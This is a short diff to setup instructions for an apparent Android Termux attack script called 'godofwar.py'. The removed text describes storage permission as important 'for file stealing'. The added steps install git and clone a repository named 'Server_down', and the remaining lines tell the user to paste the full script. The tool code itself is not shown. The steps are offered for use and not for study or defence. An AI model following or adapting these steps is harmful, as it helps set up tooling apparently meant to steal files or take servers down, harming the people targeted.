@@ -45,9 +45,17 @@
     pkg install python tsu -y
     pip install requests
 
-# Step 3: Allow storage permission (IMPORTANT for file stealing)
+# Step 3: Allow storage permission (y)
     termux-setup-storage
 
+
+#Step 3: git install 
+      
+      pkg install git
+
+#STEP 4: FILE DOWNLOAD IN OPERATING SYSTEM 
+
+     git clone https://github.com/Darkboy-creater/Server_down.git
 # Step 4: Save the script
     nano godofwar.py
 # Paste the FULL code above
